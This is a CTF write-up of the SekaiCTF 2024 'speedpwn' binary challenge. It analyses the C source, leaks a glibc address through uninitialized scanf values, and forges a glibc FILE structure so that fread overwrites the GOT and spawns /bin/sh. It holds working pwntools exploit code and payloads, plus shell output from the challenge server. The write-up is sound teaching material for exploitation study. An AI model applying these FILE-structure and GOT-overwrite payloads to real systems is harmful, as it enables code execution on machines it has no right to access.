---
title: "speedpwn - SekaiCTF 2024"
category: "pwn"
subcategory: "prng"
type: "writeup"
tags: ["pwn", "prng", "heap", "canary", "pie", "gef", "scanf", "sekaictf", "sekaictf-2024", "2024", "ctf-writeup"]
summary: "Linux Exploitation Expert - HackTricks Training"
source:
  name: "CTFtime writeup #39462"
  url: "https://ctftime.org/writeup/39462"
original_source: "https://7rocky.github.io/en/ctf/other/sekaictf/speedpwn/"
ctf:
  name: "SekaiCTF 2024"
  year: 2024
  challenge: "speedpwn"
---

## Metadata

- **CTF:** SekaiCTF 2024
- **Task:** speedpwn
- **Author team:** ICAI Cyber Team
- **CTFtime:** <https://ctftime.org/writeup/39462>
- **Original writeup:** <https://7rocky.github.io/en/ctf/other/sekaictf/speedpwn/>

---
![Linux Exploitation Expert](https://7rocky.github.io/images/LEE.png)

Linux Exploitation Expert — HackTricks Training

Progress from binary exploitation fundamentals to advanced exploit development in Linux across user space, heap, ARM, kernel, and browser targets.

[View Course](https://hacktricks-training.com/courses/lee/) ×

We are given a 64-bit binary called `chall`:

`

```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

`

## Source code analysis

This time, we are given the full source code in C:

`

```
    #include <stdio.h>
    #include <stdlib.h>
    
    unsigned long long number_of_games;
    unsigned long long game_history;
    unsigned long long seed;
    FILE* seed_generator;
    
    int cmp(unsigned long long a, unsigned long long b) {
        if (__builtin_popcountll(a) != __builtin_popcountll(b)) {
            return __builtin_popcountll(a) > __builtin_popcountll(b) ? 1 : 0;
        }
    
        for (size_t i = 0; i < 64; i++) {
            if ((a & 1) != (b & 1)) {
                return a & 1;
            }
    
            a >>= 1;
            b >>= 1;
        }
    
        return 0;
    }
    
    void print_menu() {
        puts("f) Fight bot");
        puts("s) Simulate game");
        puts("p) Print game history");
        puts("r) Reseed bot");
        printf("> ");
    }
    
    unsigned long long get_random_ull() {
        return (unsigned long long) ((unsigned long long) rand() << 32) | (unsigned long long) rand();
    }
    
    void fight_bot() {
        unsigned long long bot_num, player_num;
        bot_num = get_random_ull();
        printf("Bot plays %llu!\nPlayer plays: ", bot_num);
        scanf("%llu%*c", &player_num);
        
        if (cmp(player_num, bot_num)) {
            puts("You win!");
            *((unsigned long long*) &game_history + (number_of_games / 64)) |= ((unsigned long long) 1 << (number_of_games % 64));
        } else {
            puts("Bot wins!");
            *((unsigned long long*) &game_history + (number_of_games / 64)) &= (~((unsigned long long) 1 << (number_of_games % 64)));
        }
    
        number_of_games++;
    }
    
    void simulate() {
        unsigned long long bot_num, player_num;
        printf("Bot number: ");
        scanf("%llu%*c", &bot_num);
        printf("Player number: ");
        scanf("%llu%*c", &player_num);
        
        printf("Simulation result: ");
        cmp(bot_num, player_num) ? puts("Bot win!") : puts("You win!");
    }
    
    void print_game_history() {
        for (size_t i = 0; i < number_of_games; i++) {
            printf("Game %d: %s\n", (int) i + 1, (*((unsigned long long*) &game_history + (number_of_games / 64)) & (1 << (i % 64))) == 1 ? "Won" : "Lost");
        }
    }
    
    void reseed() {
        puts("Bot reseeded!");
        fread((char*) &seed, 1, 8, seed_generator);
        srand(seed);
    }
    
    void init() {
        setvbuf(stdout, NULL, _IONBF, 0);
        seed_generator = fopen("/dev/urandom", "r");
    }
    
    int main(int argc, char* argv[]) {
        char choice;
        init();
        reseed();
    
        while (1) {
            print_menu();
    
            while ((choice = getc(stdin)), choice == '\n');
    
            switch (choice) {
                case 'f':
                    fight_bot();
                    break;
                case 's':
                    simulate();
                    break;
                case 'p':
                    print_game_history();
                    break;
                case 'r':
                    reseed();
                    break;
                default:
                    puts("Invalid choice");
                    break;
            }
        }
    
        return 0;
    }
```

`

This program allows us to fight with a bot. The game consists in two players sending a 64-bit integer. The winner is the one that has more bits set to `1`. In case both numbers have the same bit count, wins the one that has more bits at `1` as least significant bits.

For instance, `111...1` wins `000...0`, and `1011...1` wins `1101...1`. The function that handles this process is `cmp`:

`

```
    int cmp(unsigned long long a, unsigned long long b) {
        if (__builtin_popcountll(a) != __builtin_popcountll(b)) {
            return __builtin_popcountll(a) > __builtin_popcountll(b) ? 1 : 0;
        }
    
        for (size_t i = 0; i < 64; i++) {
            if ((a & 1) != (b & 1)) {
                return a & 1;
            }
    
            a >>= 1;
            b >>= 1;
        }
    
        return 0;
    }
```

`

We have two possibilities, one of them is `fight_bot`, and the bot choice is random:

`

```
    void fight_bot() {
        unsigned long long bot_num, player_num;
        bot_num = get_random_ull();
        printf("Bot plays %llu!\nPlayer plays: ", bot_num);
        scanf("%llu%*c", &player_num);
        
        if (cmp(player_num, bot_num)) {
            puts("You win!");
            *((unsigned long long*) &game_history + (number_of_games / 64)) |= ((unsigned long long) 1 << (number_of_games % 64));
        } else {
            puts("Bot wins!");
            *((unsigned long long*) &game_history + (number_of_games / 64)) &= (~((unsigned long long) 1 << (number_of_games % 64)));
        }
    
        number_of_games++;
    }
```

`

Here, we can either win or lose. The result will be written as a bit in `game_history`. Notice that we can easily decide to win or lose by sending `111...1` or `000...0`.

Also, there is an out-of-bounds (OOB) write here, since we can write past `game_history`, as long as we can increase the value of `number_of_games`:

`

```
        if (cmp(player_num, bot_num)) {
            puts("You win!");
            *((unsigned long long*) &game_history + (number_of_games / 64)) |= ((unsigned long long) 1 << (number_of_games % 64));
        } else {
            puts("Bot wins!");
            *((unsigned long long*) &game_history + (number_of_games / 64)) &= (~((unsigned long long) 1 << (number_of_games % 64)));
        }
```

`

Since `game_history` is a global variable, maybe we can alter the subsequent global variables:

`

```
    unsigned long long number_of_games;
    unsigned long long game_history;
    unsigned long long seed;
    FILE* seed_generator;
```

`

The other option we have is to simulate a fight with `simulate`, where we can choose both numbers to play:

`

```
    void simulate() {
        unsigned long long bot_num, player_num;
        printf("Bot number: ");
        scanf("%llu%*c", &bot_num);
        printf("Player number: ");
        scanf("%llu%*c", &player_num);
        
        printf("Simulation result: ");
        cmp(bot_num, player_num) ? puts("Bot win!") : puts("You win!");
    }
```

`

At first glance, this function is useless for exploitation. But we’ll see later.

There’s one more function to print the history of fights:

`

```
    void print_game_history() {
        for (size_t i = 0; i < number_of_games; i++) {
            printf("Game %d: %s\n", (int) i + 1, (*((unsigned long long*) &game_history + (number_of_games / 64)) & (1 << (i % 64))) == 1 ? "Won" : "Lost");
        }
    }
```

`

However, this function does not work as expected, because of the `== 1` at the end. It could have been a nice function to get a kind of OOB read and leak some memory addresses. But we can conclude that this function is useless.

We might also want to use `reseed`, to renew the seed of the PRNG:

`

```
    void reseed() {
        puts("Bot reseeded!");
        fread((char*) &seed, 1, 8, seed_generator);
        srand(seed);
    }
```

`

There’s nothing more to do. We only found an OOB write, but we can’t do anything without memory leaks…

## Setup environment

We might want to patch the binary so that it uses the provided Glibc and loader:

`

```
    $ cp libc-2.39.so libc.so.6
    
    $ patchelf --set-interpreter ld-2.39.so --set-rpath . chall
```

`

## Debugging with GDB

First thing we can do is analyze the OOB write, to see what we can clobber:

`

```
    $ gdb -q chall
    Reading symbols from chall...
    (No debugging symbols found in chall)
    gef> run
    Starting program: /tmp/chall
    warning: Expected absolute pathname for libpthread in the inferior, but got ./libc.so.6.
    warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.
    Bot reseeded!
    f) Fight bot
    s) Simulate game
    p) Print game history
    r) Reseed bot
    > ^C
    Program received signal SIGINT, Interrupt.
    0x00007ffff7ec6a61 in read () from ./libc.so.6
```

`

`

```
    gef> x/10gx &game_history
    0x404088 <game_history>:        0x0000000000000000      0xa1833112f255d417
    0x404098 <seed_generator>:      0x00000000004052a0      0x0000000000000000
    0x4040a8:       0x0000000000000000      0x0000000000000000
    0x4040b8:       0x0000000000000000      0x0000000000000000
    0x4040c8:       0x0000000000000000      0x0000000000000000
```

`

We see that the `FILE` structure from `seed_generator` is stored at `0x4052a0`:

`

```
    gef> x/60gx 0x4052a0
    0x4052a0:       0x00000000fbad2488      0x0000000000405488
    0x4052b0:       0x0000000000406480      0x0000000000405480
    0x4052c0:       0x0000000000405480      0x0000000000405480
    0x4052d0:       0x0000000000405480      0x0000000000405480
    0x4052e0:       0x0000000000406480      0x0000000000000000
    0x4052f0:       0x0000000000000000      0x0000000000000000
    0x405300:       0x0000000000000000      0x00007ffff7faf4e0
    0x405310:       0x0000000000000003      0x0000000000000000
    0x405320:       0x0000000000000000      0x0000000000405380
    0x405330:       0xffffffffffffffff      0x0000000000000000
    0x405340:       0x0000000000405390      0x0000000000000000
    0x405350:       0x0000000000000000      0x0000000000000000
    0x405360:       0x00000000ffffffff      0x0000000000000000
    0x405370:       0x0000000000000000      0x00007ffff7fad030
    0x405380:       0x0000000000000000      0x0000000000000000
    0x405390:       0x0000000000000000      0x0000000000000000
    0x4053a0:       0x0000000000000000      0x0000000000000000
    0x4053b0:       0x0000000000000000      0x0000000000000000
    0x4053c0:       0x0000000000000000      0x0000000000000000
    0x4053d0:       0x0000000000000000      0x0000000000000000
    0x4053e0:       0x0000000000000000      0x0000000000000000
    0x4053f0:       0x0000000000000000      0x0000000000000000
    0x405400:       0x0000000000000000      0x0000000000000000
    0x405410:       0x0000000000000000      0x0000000000000000
    0x405420:       0x0000000000000000      0x0000000000000000
    0x405430:       0x0000000000000000      0x0000000000000000
    0x405440:       0x0000000000000000      0x0000000000000000
    0x405450:       0x0000000000000000      0x0000000000000000
    0x405460:       0x0000000000000000      0x0000000000000000
    0x405470:       0x00007ffff7fad228      0x0000000000001011
```

`

Alright, so we could be able to modify this `FILE` structure using the OOB write. However, we need to get a Glibc leak before attempting this.

Notice that the binary has Partial RELRO and no PIE, so we can easily target the GOT. For instance, we will try to tell that some function in the GOT resolves to `system` and then execute `system("/bin/sh")`.

### Leaking memory addresses

After a lot of thinking, I found out what was the purpose of `simulate`. It is supposed to be exploited to leak uninitialized values in `scanf`! Let’s have a look:

`

```
    gef> break __isoc99_scanf
    Breakpoint 1 at 0x7ffff7e0ae08
    gef> break cmp
    Breakpoint 2 at 0x40125e
    gef> continue
    Continuing.
    s
    Bot number:
    Breakpoint 1, 0x00007ffff7e0ae08 in __isoc99_scanf () from ./libc.so.6
```

`

We are sending a `-` sign to avoid that `scanf` writes anything to `$rsi`, it just leaves the register untouched:

`

```
    gef> x/s $rdi
    0x40206f:       "%llu%*c"
    gef> x/gx $rsi
    0x7fffffffe728: 0x00007ffff7e405c2
    gef> x 0x00007ffff7e405c2
    0x7ffff7e405c2 <_IO_default_uflow+50>:  0x438b480f74fff883
    gef> c
    Continuing.
    -
    Player number:
    Breakpoint 1, 0x00007ffff7e0ae08 in __isoc99_scanf () from ./libc.so.6
```

`

We see that in the first `scanf` we have `$rsi = 0x7ffff7e405c2`, which is a Glibc address. The second `scanf` contains a stack address (not so important):

`

```
    gef> x/s $rdi
    0x40206f:       "%llu%*c"
    gef> x/gx $rsi
    0x7fffffffe730: 0x00007fffffffe898
    gef> continue
    Continuing.
    -
    Simulation result:
    Breakpoint 2, 0x000000000040125e in cmp ()
```

`

And those values are sent to `cmp`:

`

```
    gef> p/x $rdi
    $1 = 0x7ffff7e405c2
    gef> p/x $rsi
    $2 = 0x7fffffffe898
```

`

Therefore, we can use `simulate` as an oracle to find the value of `$rsi` when it is a Glibc address! This is the function I used for that in the Python exploit:

`

```
    def simulate_player(number: int) -> bool:
        io.sendlineafter(b'> ', b's')
        io.sendlineafter(b'Bot number: ', b'-')
        io.sendlineafter(b'Player number: ', str(number).encode())
        return b'You win!' in io.recvline()
```

`

The way `cmp` works makes it a bit difficult to find a binary oracle. First of all, we must find the number of bits set to `1`, which is relatively easy:

`

```
    for e in range(1, 64 + 1):
        if simulate_player(2 ** e - 1):
            break
```

`

As can be seen, we just increase the number of bits until we win. At this point, we will know `e` is the number of bits set to `1`. Next, I came up with this algorithm after a lot of testing:

`

```
    known = 0
    bit = 0
    
    while known.bit_count() != e:
        test = known
        m1 = test + int(('1' * (e - test.bit_count())).zfill(64)[::-1], 2)
        test |= (1 << bit)
        m2 = test + int(('1' * (e - test.bit_count())).zfill(64)[::-1], 2)
    
        if not simulate_player(m1) and not simulate_player(m2):
            known |= 1 << bit
    
        bit += 1
    
    glibc.address = ((known & 0x7fffffffffff) | 0x7e0000000000) - 0x955c2
    io.success(f'Glibc base address: {hex(glibc.address)}')
```

`

For some reason, it is not totally correct because I need to fix some of the most significant bits to have the format of a Glibc address. Probably because `cmp` makes the player lose when the two numbers are equal.

The idea is to try two similar integers, and see if both lose. Here are some steps with an example in 8 bits:

`

```
    Target: 0010 1011
    
    bit   = 0
    known = 0000 0000
    m1    = 1111 0000 => Lose
    m2    = 1110 0001 => Lose
    
    bit   = 1
    known = 0000 0001
    m1    = 1110 0001 => Lose
    m2    = 1100 0011 => Lose
    
    bit   = 2
    known = 0000 0011
    m1    = 1100 0011 => Lose
    m2    = 1000 0111 => Win
    
    bit   = 3
    known = 0000 0011
    m1    = 1100 0011 => Lose
    m2    = 1000 1011 => Lose
    
    bit   = 4
    known = 0000 1011
    m1    = 1000 1011 => Lose
    m2    = 0001 1011 => Win
    
    bit   = 5
    known = 0000 1011
    m1    = 1000 1011 => Lose
    m2    = 0010 1011 => Win
    
    bit   = 6
    known = 0000 1011
    m1    = 1000 1011 => Lose
    m2    = 0100 1011 => Lose
    
    known = 0100 1011
```

`

As can be seen, it fails to find exactly the target value, but it works with the Glibc address because we know the format is always `0x00007f**********`.

## Exploit development

Once we have leaked Glibc, we can proceed with a `FILE` structure attack using the OOB write. I used this function to write either a bit `0` or `1` (using `000...0` or `111...1`):

`

```
    def fight(win: bool = False):
        io.sendlineafter(b'> ', b'f')
        io.sendlineafter(b'Player plays: ', b'18446744073709551615' if win else b'0')
        assert (b'You win!' if win else b'Bot wins!') in io.recvline()
```

`

### `FILE` structure attack

We need to perform a `FILE` structure attack because it is the only thing we can clobber using the OOB write. The first time I dealt with `FILE` structure attacks was when I made [FileStorage](https://7rocky.github.io/en/ctf/htb-challenges/pwn/filestorage).

The attack we will be doing is actually the same I designed for [FileStorage](https://7rocky.github.io/en/ctf/htb-challenges/pwn/filestorage), which is explained in [Play with FILE Structure - Yet Another Binary Exploit Technique](https://es.slideshare.net/slideshow/play-with-file-structure-yet-another-binary-exploit-technique/81635564#2), pages 66 - 70.

The idea is that `fread` will allow us to write into memory, not only at `seed`, but also in other places as long as the fields `_IO_buf_base` and `_IO_buf_end` have some addresses where to write at, with some positive difference. Let’s review the `FILE` structure from `seed_generator`:

`

```
    gef> x/60gx 0x4052a0
    0x4052a0:       0x00000000fbad2488      0x0000000000405488
    0x4052b0:       0x0000000000406480      0x0000000000405480
    0x4052c0:       0x0000000000405480      0x0000000000405480
    0x4052d0:       0x0000000000405480      0x0000000000405480
    0x4052e0:       0x0000000000406480      0x0000000000000000
    0x4052f0:       0x0000000000000000      0x0000000000000000
    0x405300:       0x0000000000000000      0x00007ffff7faf4e0
    0x405310:       0x0000000000000003      0x0000000000000000
    0x405320:       0x0000000000000000      0x0000000000405380
    0x405330:       0xffffffffffffffff      0x0000000000000000
    0x405340:       0x0000000000405390      0x0000000000000000
    0x405350:       0x0000000000000000      0x0000000000000000
    0x405360:       0x00000000ffffffff      0x0000000000000000
    0x405370:       0x0000000000000000      0x00007ffff7fad030
    0x405380:       0x0000000000000000      0x0000000000000000
    0x405390:       0x0000000000000000      0x0000000000000000
    0x4053a0:       0x0000000000000000      0x0000000000000000
    0x4053b0:       0x0000000000000000      0x0000000000000000
    0x4053c0:       0x0000000000000000      0x0000000000000000
    0x4053d0:       0x0000000000000000      0x0000000000000000
    0x4053e0:       0x0000000000000000      0x0000000000000000
    0x4053f0:       0x0000000000000000      0x0000000000000000
    0x405400:       0x0000000000000000      0x0000000000000000
    0x405410:       0x0000000000000000      0x0000000000000000
    0x405420:       0x0000000000000000      0x0000000000000000
    0x405430:       0x0000000000000000      0x0000000000000000
    0x405440:       0x0000000000000000      0x0000000000000000
    0x405450:       0x0000000000000000      0x0000000000000000
    0x405460:       0x0000000000000000      0x0000000000000000
    0x405470:       0x00007ffff7fad228      0x0000000000001011
```

`

Notice that the `3` means that `fread` will take information from file descriptor number `3`. We can even modify this to set `0`, which is the file descriptor for `stdin`. As a result, we will be able toenter arbitrary data.

Moreover, it doesn’t matter if `fread` is called as `fread((char*) &seed, 1, 8, seed_generator)`, because we can control the length to be read with `_IO_buf_end - _IO_buf_base`.

### Diving into the `FILE` structure attack

It might seem magic that we will be writing arbitrary data just modifying `_IO_buf_end` and `_IO_buf_base`. But it’s not magic, let’s review the relevant Glibc source code (version 2.39). We will start by [`fread`](https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/iofread.c#L30):

`

```
    size_t
    _IO_fread (void *buf, size_t size, size_t count, FILE *fp)
    {
      size_t bytes_requested = size * count;
      size_t bytes_read;
      CHECK_FILE (fp, 0);
      if (bytes_requested == 0)
        return 0;
      _IO_acquire_lock (fp);
      bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);
      _IO_release_lock (fp);
      return bytes_requested == bytes_read ? count : bytes_read / size;
    }
    libc_hidden_def (_IO_fread)
```

`

This function is just a wrapper for [`_IO_sgetn`](https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/genops.c#L408):

`

```
    size_t
    _IO_sgetn (FILE *fp, void *data, size_t n)
    {
      /* FIXME handle putback buffer here! */
      return _IO_XSGETN (fp, data, n);
    }
```

`

This `_IO_sgetn` function calls a macro called [`_IO_XSGETN`](https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/libioP.h#L184):

`

```
    /* The 'xsgetn' hook reads upto N characters into buffer DATA.
       Returns the number of character actually read.
       It matches the streambuf::xsgetn virtual function. */
    typedef size_t (*_IO_xsgetn_t) (FILE *FP, void *DATA, size_t N);
    #define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)
```

`

This is just a way to call a function from a _vtable_. In order to find which function it is, we can search for `xsgetn` and find out the functions for `FILE` objects:

`

```
    /* Jumptable functions for files. */
    
    /* ... */
    
    extern size_t _IO_file_xsgetn (FILE *, void *, size_t);
    libc_hidden_proto (_IO_file_xsgetn)
```

`

And here we find function [`_IO_file_xsgetn`](https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/fileops.c#L1272). This is the relevant code:

`

```
    size_t
    _IO_file_xsgetn (FILE *fp, void *data, size_t n)
    {
      size_t want, have;
      ssize_t count;
      char *s = data;
    
      want = n;
    
      if (fp->_IO_buf_base == NULL)
        {
          /* ... */
        }
    
      while (want > 0)
        {
          have = fp->_IO_read_end - fp->_IO_read_ptr;
          if (want <= have)
            {
              /* ... */
            }
          else
            {
              if (have > 0)
                {
                  /* ... */
                }
    
              /* ... */
    
              /* If we now want less than a buffer, underflow and repeat
                the copy.  Otherwise, _IO_SYSREAD directly to
                the user buffer. */
              if (fp->_IO_buf_base
                  && want < (size_t) (fp->_IO_buf_end - fp->_IO_buf_base))
                {
                  if (__underflow (fp) == EOF)
                    break;
    
                  continue;
                }
    
              /* ... */
            }
        }
    
      return n - want;
    }
```

`

The target is to call [`__underflow`](https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/genops.c#L268). For this, we must have a non-zero value at `fp->buf_base` and also `want < fp->buf_end - fp->buf_base`. The `__underflow` function will check some bits of `fp->_flags`:

`

```
    int
    __underflow (FILE *fp)
    {
      if (_IO_vtable_offset (fp) == 0 && _IO_fwide (fp, -1) != -1)
        return EOF;
    
      if (fp->_mode == 0)
        _IO_fwide (fp, -1);
      if (_IO_in_put_mode (fp))
        if (_IO_switch_to_get_mode (fp) == EOF)
          return EOF;
      if (fp->_IO_read_ptr < fp->_IO_read_end)
        return *(unsigned char *) fp->_IO_read_ptr;
      if (_IO_in_backup (fp))
        {
          _IO_switch_to_main_get_area (fp);
          if (fp->_IO_read_ptr < fp->_IO_read_end)
      return *(unsigned char *) fp->_IO_read_ptr;
        }
      if (_IO_have_markers (fp))
        {
          if (save_for_backup (fp, fp->_IO_read_end))
      return EOF;
        }
      else if (_IO_have_backup (fp))
        _IO_free_backup_area (fp);
      return _IO_UNDERFLOW (fp);
    }
```

`

And in the end, it will call `IO_UNDERFLOW`, a macro that will call [`_IO_new_file_underflow`](https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/fileops.c#L461) (to find this function, I needed to use a disassembler for `libc-2.39.so` and GDB, until I found the correct function name):

`

```
    int
    _IO_new_file_underflow (FILE *fp)
    {
      ssize_t count;
    
      /* C99 requires EOF to be "sticky".  */
      if (fp->_flags & _IO_EOF_SEEN)
        return EOF;
    
      if (fp->_flags & _IO_NO_READS)
        {
          /* ... */
        }
      if (fp->_IO_read_ptr < fp->_IO_read_end)
        return *(unsigned char *) fp->_IO_read_ptr;
    
      if (fp->_IO_buf_base == NULL)
        {
          /* ... */
        }
    
      /* FIXME This can/should be moved to genops ?? */
      if (fp->_flags & (_IO_LINE_BUF|_IO_UNBUFFERED))
        {
          /* ... */
        }
    
      _IO_switch_to_get_mode (fp);
    
      /* This is very tricky. We have to adjust those
         pointers before we call _IO_SYSREAD () since
         we may longjump () out while waiting for
         input. Those pointers may be screwed up. H.J. */
      fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;
      fp->_IO_read_end = fp->_IO_buf_base;
      fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end
        = fp->_IO_buf_base;
    
      count = _IO_SYSREAD (fp, fp->_IO_buf_base,
                           fp->_IO_buf_end - fp->_IO_buf_base);
      if (count <= 0)
        {
          /* ... */
        }
      fp->_IO_read_end += count;
      if (count == 0)
        {
          /* ... */
        }
      if (fp->_offset != _IO_pos_BAD)
        _IO_pos_adjust (fp->_offset, count);
      return *(unsigned char *) fp->_IO_read_ptr;
    }
```

`

Here, if we set `fp->_flags` accordingly, we will be able to call `_IO_SYSREAD(fp, fp->_IO_buf_base, fp->_IO_buf_end - fp->_IO_buf_base)`, which is a simple `syscall` instruction that gives us the write primitive.

Also notice that `_IO_file_xsgetn` will continue the `while` loop and the `FILE` structure will have `fp->_IO_read_end` and `fp->_IO_read_ptr` updated. In the end this means that the `8` bytes (`want`) specified in `fread` will be written to `seed` from `fp->_IO_read_ptr`:

`

```
    size_t
    _IO_file_xsgetn (FILE *fp, void *data, size_t n)
    {
      size_t want, have;
      ssize_t count;
      char *s = data;
    
      want = n;
    
      if (fp->_IO_buf_base == NULL)
        {
          /* ... */
        }
    
      while (want > 0)
        {
          have = fp->_IO_read_end - fp->_IO_read_ptr;
          if (want <= have)
            {
              memcpy (s, fp->_IO_read_ptr, want);
              fp->_IO_read_ptr += want;
              want = 0;
            }
          else
            {
              /* ... */
            }
        }
    
      return n - want;
    }
```

`

We will use this fake `FILE` structure as a payload:

`

```
    fp = flat([
        0xfbad2000,                    0,
        0,                             0,
        0,                             0,
        0,                             elf.got.fread,
        elf.got.fread + len(payload),  0,
        0,                             0,
        0,                             glibc.sym._IO_2_1_stderr_,
        0,                             0,
        0,                             target + 0xe0,
        0xffffffffffffffff,            0,
        target + 0xf0,                 0,
        0,                             0,
        0xffffffff,                    0,
        0,                             glibc.sym._IO_file_jumps,
    ])
```

`

Relevant fields are:

  * `fp->_flags`
  * `fp->_IO_buf_base`
  * `fp->_IO_buf_end`
  * `fp->_fileno`


The rest can be left as they were initially (some Glibc and binary addresses might be needed). Actually, we can just overwrite up to `fp->_fileno`, since the rest will not be modified, but I leave that for the sake of clarity, although the exploit will take more time to finish.

### Exploit strategy

Since we have an arbitrary write primitive and the binary has Partial RELRO, we will perform a GOT overwrite. The best option is to make `srand` be `system`, so that `reseed` executes `system("/bin/sh")`:

`

```
    void reseed() {
        puts("Bot reseeded!");
        fread((char*) &seed, 1, 8, seed_generator);
        srand(seed);
    }
```

`

However, recall that the `fread` is still performed, so `seed` is still filled with 8 bytes taken from `fp->_IO_read_ptr`. This is the GOT:

`

```
    gef> got
    ----------------------------------------------------------- PLT / GOT - /tmp/chall - Partial RELRO -----------------------------------------------------------
    Name              | PLT            | GOT            | GOT value     
    ------------------------------------------------------------------------- .rela.dyn -------------------------------------------------------------------------
    __libc_start_main | Not found      | 0x000000403fd8 | 0x7f3bdcf9d200 <__libc_start_main>
    __gmon_start__    | Not found      | 0x000000403fe0 | 0x000000000000
    ------------------------------------------------------------------------- .rela.plt -------------------------------------------------------------------------
    puts              | Not found      | 0x000000404000 | 0x7f3bdcffabd0 <puts>
    fread             | Not found      | 0x000000404008 | 0x7f3bdcff93f0 <fread>
    __stack_chk_fail  | Not found      | 0x000000404010 | 0x000000401050 <.plt+0x30>
    printf            | Not found      | 0x000000404018 | 0x7f3bdcfd30f0 <printf>
    srand             | Not found      | 0x000000404020 | 0x7f3bdcfbd0f0 <srandom>
    setvbuf           | Not found      | 0x000000404028 | 0x7f3bdcffb540 <setvbuf>
    fopen             | Not found      | 0x000000404030 | 0x7f3bdcff8e50 <fopen64>
    __isoc99_scanf    | Not found      | 0x000000404038 | 0x7f3bdcfd2e00 <__isoc99_scanf>
    getc              | Not found      | 0x000000404040 | 0x7f3bdd001f60 <getc>
    rand              | Not found      | 0x000000404048 | 0x7f3bdcfbd090 <rand>
```

`

And this was the working payload:

`

```
    payload = p64(0x404088)          + p64(glibc.sym.__stack_chk_fail) + \
              p64(glibc.sym.printf)  + p64(glibc.sym.system)           + \
              p64(glibc.sym.setvbuf) + p64(glibc.sym.fopen)            + \
              p64(glibc.sym.scanf)   + p64(glibc.sym.getc)             + \
              p64(glibc.sym.rand)    + p64(0)                          + \
              p64(0)                 + p64(glibc.sym._IO_2_1_stdout_)  + \
              p64(0)                 + p64(glibc.sym._IO_2_1_stdin_)   + \
              p64(0)                 + p64(0)                          + \
              b'/bin/sh\0'
```

`

Basically, `seed` will contain `0x404088`, and at `0x404088` we will find `"/bin/sh\0"`. Moreover, the GOT entry for `srand` will be `system`. The rest are untouched, except for `fread` (set to `0x404088`, but doesn’t matter).

This payload is sent when `fread` uses our fake `FILE` structure, because `fp->_fileno` is set to `0` (`stdin`):

`

```
    io.sendlineafter(b'> ', b'r')
    io.recvuntil(b'Bot reseeded!\n')
    
    io.send(payload)
    io.interactive()
```

`

Right after sending the payload, `fread` will modify the GOT and the function `reseed` will execute `system("/bin/sh")` afterwards, so we will have a shell:

`

```
    $ python3 solve.py
    [*] './chall'
        Arch:       amd64-64-little
        RELRO:      Partial RELRO
        Stack:      Canary found
        NX:         NX enabled
        PIE:        No PIE (0x3ff000)
        RUNPATH:    b'.'
        SHSTK:      Enabled
        IBT:        Enabled
        Stripped:   No
    [+] Starting local process './chall': pid 2217831
    [+] Glibc base address: 0x7f863880f000
    [+] Writing FILE struct: Done
    [*] Switching to interactive mode
    $ whoami
    rocky
```

`

## Flag

Let’s try in the remote instance:

`

```
    $ python3 solve.py speedpwn.chals.sekai.team 1337
    [*] './chall'
        Arch:       amd64-64-little
        RELRO:      Partial RELRO
        Stack:      Canary found
        NX:         NX enabled
        PIE:        No PIE (0x3ff000)
        RUNPATH:    b'.'
        SHSTK:      Enabled
        IBT:        Enabled
        Stripped:   No
    [+] Opening connection to speedpwn.chals.sekai.team on port 1337: Done
    [+] Glibc base address: 0x7f08c3fc2000
    [+] Writing FILE struct: Done
    [*] Switching to interactive mode
    $ ls
    chall
    flag.txt
    ld-2.39.so
    libc-2.39.so
    $ cat flag.txt
    SEKAI{congratz_you_beat_the_bot_and_hopefully_got_the_bounty!_1dee87}
```

`

The full exploit can be found in here: [`solve.py`](https://github.com/7Rocky/CTF-scripts/tree/main/SekaiCTF/speedpwn/solve.py).
